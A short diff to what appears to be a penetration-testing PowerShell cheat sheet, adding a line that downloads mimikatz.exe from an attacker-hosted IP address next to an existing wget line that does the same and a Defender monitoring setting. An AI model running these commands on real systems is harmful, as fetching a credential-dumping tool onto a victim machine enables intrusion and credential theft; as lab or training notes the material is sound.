@@ -14,6 +14,7 @@ PS C:\> Set-MpPreference -DisableRealtimeMonitoring $false
 # File Transfer
 
 PS C:\> powershell.exe wget http://10.10.12.39/mimikatz.exe -outfile C:\users\administrator\desktop\mimikatz.exe
+PS C:\> powershell.exe Invoke-WebRequest http://10.10.12.39/mimikatz.exe -o mimikatz.exe
 
 # Running a Powershell function from command line.
 
